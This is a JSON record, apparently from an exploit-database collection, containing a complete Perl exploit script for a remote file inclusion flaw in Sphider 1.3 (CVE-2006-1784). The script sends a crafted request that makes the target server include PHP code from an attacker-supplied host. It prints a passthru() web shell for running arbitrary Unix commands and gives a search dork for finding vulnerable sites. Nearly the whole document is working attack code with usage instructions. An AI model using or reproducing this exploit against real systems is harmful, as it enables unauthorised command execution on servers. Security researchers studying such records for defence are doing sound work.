{
  "id": "1665",
  "title": "Sphider 1.3 - &#039;configset.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-1784",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n\r\nprint \"\\r\\nSphider <= 1.3 arbitrary remote inclusion\\r\\n\" ;\r\nprint \"-> works with register_globals = On & allow_url_fopen = On\\r\\n\";\r\nprint \"by rgod rgod<AT>autistici<DOT>org\\r\\n\";\r\nprint \"site: http://retrogod.altervista.org\\r\\n\";\r\nprint \"\\r\\ndork: \\\"powered by sphider\\\"\\r\\n\";\r\n\r\nsub main::urlEncode {\r\n    my ($string) = @_;\r\n    $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n    #$string# =~ tr/.//;\r\n    return $string;\r\n }\r\n\r\n$serv=$ARGV[0];\r\n$path=$ARGV[1];\r\n$loc=urlEncode($ARGV[2]);\r\n$cmd=\"\"; for ($i=3; $i<=$#ARGV; $i++) {$cmd.=\"%20\".urlEncode($ARGV[$i]);};\r\n\r\nif (@ARGV < 4)\r\n{\r\nprint \"\\r\\nUsage:\\r\\n\";\r\nprint \"perl sphider_xpl.pl server path location command\\r\\n\\r\\n\";\r\nprint \"server         - Server where sphider is installed.\\r\\n\";\r\nprint \"path           - Path to sphider (ex: /sphider/ or just /) \\r\\n\";\r\nprint \"location       - a site with the code to include (without ending slash)\\r\\n\";\r\nprint \"command        - a Unix command\\r\\n\\r\\n\";\r\nprint \"Example:\\r\\n\";\r\nprint \"perl sphider_xpl.pl localhost /sphider/ http://192.168.1.3 ls -la\\r\\n\\r\\n\";\r\nprint \"note: on http location you need this code in /conf.php/index.html :\\r\\n\\r\\n\";\r\nprint \"<?php\\r\\n\";\r\nprint \"ob_clean();\\r\\n\";\r\nprint \"if (get_magic_quotes_gpc())\\r\\n\";\r\nprint \"{\\$_GET[\\\"cmd\\\"]=stripslashes(\\$_GET[\\\"cmd\\\"]);}\\r\\n\";\r\nprint \"ini_set(\\\"max_execution_time\\\",0);\\r\\n\";\r\nprint \"echo 56789;\\r\\n\";\r\nprint \"passthru(\\$_GET[\\\"cmd\\\"]);\\r\\n\";\r\nprint \"die;\\r\\n\";\r\nprint \"?>\\r\\n\";\r\nexit();\r\n}\r\n  $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", Timeout  => 10, PeerPort=>\"http(80)\")\r\n  or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n  print $sock \"GET \".$path.\"admin/configset.php?cmd=\".$cmd.\"&settings_dir=\".$loc.\" HTTP/1.0\\r\\n\";\r\n  print $sock \"Host: \".$serv.\"\\r\\n\";\r\n  print $sock \"Connection: Close\\r\\n\\r\\n\";\r\n  $out=\"\";\r\n  while ($answer = <$sock>) {\r\n    $out.=$answer;\r\n  }\r\n  close($sock);\r\n  @temp= split /56789/,$out,2;\r\n  if ($#temp>0) {print \"\\r\\nExploit succeeded...\\r\\n\".$temp[1];exit();}\r\n  #if you are here...\r\n  print \"\\r\\nExploit failed...\\r\\n\";\r\n\r\n# milw0rm.com [2006-04-12]",
  "url": "https://www.exploit-db.com/exploits/1665"
}